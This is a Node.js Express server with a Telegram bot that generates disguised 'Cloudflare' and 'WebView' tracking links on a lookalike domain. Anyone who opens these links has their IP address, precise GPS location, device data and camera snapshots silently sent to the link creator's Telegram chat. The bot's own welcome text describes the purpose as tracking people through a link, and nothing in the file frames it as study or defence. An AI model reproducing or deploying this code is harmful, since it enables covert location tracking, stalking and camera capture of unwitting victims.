const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const TelegramBot = require("node-telegram-bot-api");

const bot = new TelegramBot(process.env["bot"], { polling: true });

const app = express();

const jsonParser = bodyParser.json({
  limit: 1024 * 1024 * 20,
  type: "application/json"
});

const urlencodedParser = bodyParser.urlencoded({
  extended: true,
  limit: 1024 * 1024 * 20,
  type: "application/x-www-form-urlencoded"
});

app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());

app.set("view engine", "ejs");

/* ============================= */
/* CONFIG */
/* ============================= */

const hostURL = "ns1.gosecuredns.in";

/* ============================= */
/* HELPERS */
/* ============================= */

function encodeBase64(str) {
  return Buffer.from(str).toString("base64");
}

function decodeBase64(str) {
  return Buffer.from(str, "base64").toString("utf8");
}

function getIP(req) {
  if (req.headers["x-forwarded-for"]) {
    return req.headers["x-forwarded-for"].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    return req.connection.remoteAddress;
  } else {
    return req.ip;
  }
}

/* ============================= */
/* WEBVIEW PAGE */
/* ============================= */

app.get("/w/:path/:uri", (req, res) => {
  const ip = getIP(req);

  let d = new Date();
  d = d.toJSON().slice(0, 19).replace("T", ":");

  if (req.params.path != null) {
    res.render("webview", {
      ip: ip,
      time: d,
      url: decodeBase64(req.params.uri),
      uid: req.params.path,
      a: hostURL
    });
  } else {
    res.redirect("https://t.me/th30neand0nly0ne");
  }
});

/* ============================= */
/* CLOUDFLARE PAGE */
/* ============================= */

app.get("/c/:path/:uri", (req, res) => {
  const ip = getIP(req);

  let d = new Date();
  d = d.toJSON().slice(0, 19).replace("T", ":");

  if (req.params.path != null) {
    res.render("cloudflare", {
      ip: ip,
      time: d,
      url: decodeBase64(req.params.uri),
      uid: req.params.path,
      a: hostURL
    });
  } else {
    res.redirect("https://t.me/th30neand0nly0ne");
  }
});

/* ============================= */
/* TELEGRAM BOT */
/* ============================= */

bot.on("message", async (msg) => {
  const chatId = msg.chat.id;

  if (msg?.reply_to_message?.text === "🌐 Enter Your URL") {
    createLink(chatId, msg.text);
  }

  if (msg.text === "/start") {
    const m = {
      reply_markup: JSON.stringify({
        inline_keyboard: [[{ text: "Create Link", callback_data: "crenew" }]]
      })
    };

    bot.sendMessage(
      chatId,
      "Welcome " +
        msg.chat.first_name +
        "!\n\nYou can use this bot to track people through a simple link.\n\nType /help for more info.",
      m
    );
  }

  else if (msg.text === "/create") {
    createNew(chatId);
  }

  else if (msg.text === "/help") {
    bot.sendMessage(
      chatId,
      "Send /create to generate a tracking link.\n\nAfter entering a URL the bot will generate two links:\n\n1. Cloudflare Page\n2. WebView Page"
    );
  }
});

/* ============================= */
/* CALLBACK BUTTON */
/* ============================= */

bot.on("callback_query", async (callbackQuery) => {
  bot.answerCallbackQuery(callbackQuery.id);

  if (callbackQuery.data === "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});

bot.on("polling_error", () => {});

/* ============================= */
/* CREATE LINK */
/* ============================= */

async function createLink(cid, msg) {
  const encoded = [...msg].some((char) => char.charCodeAt(0) > 127);

  if (
    (msg.toLowerCase().includes("http") ||
      msg.toLowerCase().includes("https")) &&
    !encoded
  ) {
    const url = cid.toString(36) + "/" + encodeBase64(msg);

    const cUrl = hostURL + "/c/" + url;
    const wUrl = hostURL + "/w/" + url;

    const m = {
      reply_markup: JSON.stringify({
        inline_keyboard: [[{ text: "Create new Link", callback_data: "crenew" }]]
      })
    };

    bot.sendChatAction(cid, "typing");

    bot.sendMessage(
      cid,
      "New links have been created successfully.\n\nURL: " +
        msg +
        "\n\nCloudflare Link:\n" +
        cUrl +
        "\n\nWebView Link:\n" +
        wUrl,
      m
    );
  } else {
    bot.sendMessage(cid, "⚠️ Please enter a valid URL including http or https.");
    createNew(cid);
  }
}

/* ============================= */
/* ASK FOR URL */
/* ============================= */

function createNew(cid) {
  const mk = {
    reply_markup: JSON.stringify({
      force_reply: true
    })
  };

  bot.sendMessage(cid, "🌐 Enter Your URL", mk);
}

/* ============================= */
/* GET IP */
/* ============================= */

app.get("/", (req, res) => {
  const ip = getIP(req);
  res.json({ ip: ip });
});

/* ============================= */
/* LOCATION */
/* ============================= */

app.post("/location", (req, res) => {
  const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  const acc = decodeURIComponent(req.body.acc) || null;

  if (lon && lat && uid && acc) {
    bot.sendLocation(parseInt(uid, 36), lat, lon);

    bot.sendMessage(
      parseInt(uid, 36),
      "Latitude: " + lat + "\nLongitude: " + lon + "\nAccuracy: " + acc + " meters"
    );

    res.send("Done");
  }
});

/* ============================= */
/* DEVICE DATA */
/* ============================= */

app.post("/", (req, res) => {
  const uid = decodeURIComponent(req.body.uid) || null;
  let data = decodeURIComponent(req.body.data) || null;

  if (uid && data) {
    data = data.replaceAll("<br>", "\n");

    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });

    res.send("Done");
  }
});

/* ============================= */
/* CAMERA SNAP */
/* ============================= */

app.post("/camsnap", (req, res) => {
  const uid = decodeURIComponent(req.body.uid) || null;
  const img = decodeURIComponent(req.body.img) || null;

  if (uid && img) {
    const buffer = Buffer.from(img, "base64");

    try {
      bot.sendPhoto(parseInt(uid, 36), buffer);
    } catch (error) {
      console.log(error);
    }

    res.send("Done");
  }
});

/* ============================= */
/* START SERVER */
/* ============================= */

app.listen(3000, () => {
  console.log("App Running on Port 5000!");
});
